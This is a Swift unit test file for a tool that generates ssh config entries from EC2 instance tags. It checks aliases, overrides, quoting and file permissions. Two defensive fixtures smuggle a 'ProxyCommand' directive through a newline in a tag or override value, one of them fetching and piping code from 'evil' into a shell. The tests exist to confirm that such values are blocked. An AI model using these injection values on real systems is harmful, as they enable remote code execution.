import XCTest
@testable import HangarCore

final class SSHConfigWriterTests: TemporaryDirectoryTestCase {

    private let asgA = Fixture.instance(
        ["env": "prod", "Name": "xfer", "product": "payments",
         "hostname": "i-aaa.xfer.prod.example.com",
         "aws:autoscaling:groupName": "x-prod"], id: "i-0aaaaaaaaaaaaaaaa")
    private let asgB = Fixture.instance(
        ["env": "prod", "Name": "xfer", "product": "payments",
         "hostname": "i-bbb.xfer.prod.example.com",
         "aws:autoscaling:groupName": "x-prod"], id: "i-0bbbbbbbbbbbbbbbb",
        launchTime: "2026-08-21T10:00:00.000Z")
    private let solo = Fixture.instance(
        ["env": "qa", "Name": "web", "product": "payments",
         "hostname": "web.qa.example.com"], id: "i-0ccccccccccccccc1")

    private var writer: SSHConfigWriter { SSHConfigWriter(config: .standard()) }

    // MARK: - Aliases

    func testNumbersOnlyCollidingAliases() {
        let aliases = writer.entries(for: [asgB, asgA, solo]).map { $0.aliases[0] }
        XCTAssertTrue(aliases.contains("payments-prod-xfer-1"))
        XCTAssertTrue(aliases.contains("payments-prod-xfer-2"))
        XCTAssertTrue(aliases.contains("payments-qa-web"), "a lone host keeps a bare alias")
    }

    func testNumbersByLaunchTimeOldestFirst() {
        let entries = writer.entries(for: [asgB, asgA, solo])
        XCTAssertEqual(entries.first { $0.aliases[0] == "payments-prod-xfer-1" }?.instance.id,
                       asgA.id)
    }

    func testEveryEntryAlsoAnswersToItsIdAndFQDN() {
        for entry in writer.entries(for: [asgA, asgB, solo]) {
            XCTAssertTrue(entry.aliases.contains { $0.hasSuffix(entry.instance.id.prefix(10)) })
            XCTAssertTrue(entry.aliases.contains(entry.instance.host ?? ""))
        }
    }

    // MARK: - Rendering

    func testDefaultRendering() {
        let text = writer.render(instances: [asgA, asgB, solo], region: "us-west-2")
        XCTAssertTrue(text.contains("User \(NSUserName())"))
        XCTAssertFalse(text.contains("IdentityFile"), "no key is pinned by default")
        XCTAssertFalse(text.contains("IdentitiesOnly"), "so agent keys are not shut out")
        XCTAssertTrue(text.contains("UserKnownHostsFile ~/.ssh/known_hosts.ec2"))
        XCTAssertTrue(text.contains("# hangar product=payments env=prod"))
        XCTAssertTrue(text.contains("HostName i-aaa.xfer.prod.example.com"))
    }

    func testOverridesApplyOnlyWhereTheyMatch() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments", "env": "prod"], user: "rocky",
            identityFile: "~/payments_prod.pem", knownHostsFile: nil,
            strictHostKeyChecking: nil, extraOptions: ["ProxyJump": "bastion"])]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA, solo], region: "us-west-2")
        XCTAssertTrue(text.contains("User rocky"))
        XCTAssertTrue(text.contains("IdentityFile ~/payments_prod.pem"))
        XCTAssertTrue(text.contains("IdentitiesOnly yes"), "a pinned key brings it")
        XCTAssertTrue(text.contains("ProxyJump bastion"))
        XCTAssertEqual(text.components(separatedBy: "User rocky").count - 1, 1,
                       "the override must not leak to the qa host")
    }

    // MARK: - Untrusted tag values

    func testASpaceInAHostnameTagDoesNotBreakTheFile() throws {
        // Regression: EC2 allows spaces in tag values, and an unquoted
        // `HostName web 1` made ssh reject the whole file, so a single sloppy
        // tag cost the user every alias they had.
        let spacey = Fixture.instance(["env": "qa", "Name": "web", "product": "payments",
                                       "hostname": "web 1.example.com"], id: "i-0space")
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, spacey], region: "us-west-2", to: target)

        XCTAssertNil(SSHConfigWriter.validate(target), "ssh must accept the file")
        XCTAssertEqual(result.hostCount, 2, "both hosts are still written")
        XCTAssertTrue(result.omittedHosts.isEmpty)
        let text = try String(contentsOfFile: target, encoding: .utf8)
        XCTAssertTrue(text.contains("HostName \"web 1.example.com\""), text)
    }

    func testANewlineInATagCannotInjectADirective() throws {
        let hostile = Fixture.instance(
            ["env": "prod", "Name": "web", "product": "payments",
             "hostname": "ok.example.com\n  ProxyCommand /bin/sh -c \"curl evil|sh\""],
            id: "i-0hostile")
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, hostile], region: "us-west-2", to: target)

        let text = try String(contentsOfFile: target, encoding: .utf8)
        XCTAssertFalse(text.contains("ProxyCommand"), "the directive must never be written")
        XCTAssertEqual(result.omittedHosts, ["i-0hostile"], "and the host is reported, not hidden")
        XCTAssertEqual(result.hostCount, 1, "the rest of the fleet is unaffected")
        XCTAssertNil(SSHConfigWriter.validate(target))
    }

    func testAnUnusableOverrideValueDropsOneOptionNotTheHost() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments"], user: "rocky\n  ProxyCommand evil",
            identityFile: nil, knownHostsFile: nil, strictHostKeyChecking: nil,
            extraOptions: nil)]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA], region: "us-west-2")
        XCTAssertFalse(text.contains("ProxyCommand"))
        XCTAssertFalse(text.contains("User rocky"))
        XCTAssertTrue(text.contains("HostName i-aaa.xfer.prod.example.com"),
                      "the host itself survives a bad override")
    }

    func testAKeyPathContainingASpaceIsQuoted() {
        var config = HangarConfig.standard()
        config.overrides = [HangarConfig.Override(
            match: ["product": "payments"], user: nil,
            identityFile: "~/Cloud Keys/prod.pem", knownHostsFile: nil,
            strictHostKeyChecking: nil, extraOptions: nil)]
        let text = SSHConfigWriter(config: config)
            .render(instances: [asgA], region: "us-west-2")
        XCTAssertTrue(text.contains("IdentityFile \"~/Cloud Keys/prod.pem\""), text)
    }

    // MARK: - Writing

    func testSyncWritesA0600FileThatSSHAccepts() throws {
        let target = path("hangar")
        let result = try writer.sync(instances: [asgA, asgB, solo],
                                     region: "us-west-2", to: target)
        XCTAssertTrue(FileManager.default.fileExists(atPath: target))
        XCTAssertEqual(result.hostCount, 3)
        let mode = try FileManager.default
            .attributesOfItem(atPath: target)[.posixPermissions] as? NSNumber
        XCTAssertEqual(mode?.intValue, 0o600)
        XCTAssertNil(SSHConfigWriter.validate(target))
    }

    func testMalformedConfigIsRejectedByValidation() throws {
        let bad = path("broken")
        try "Host x\n  ThisIsNotAnOption yes\n".write(toFile: bad, atomically: true,
                                                      encoding: .utf8)
        XCTAssertNotNil(SSHConfigWriter.validate(bad))
    }
}
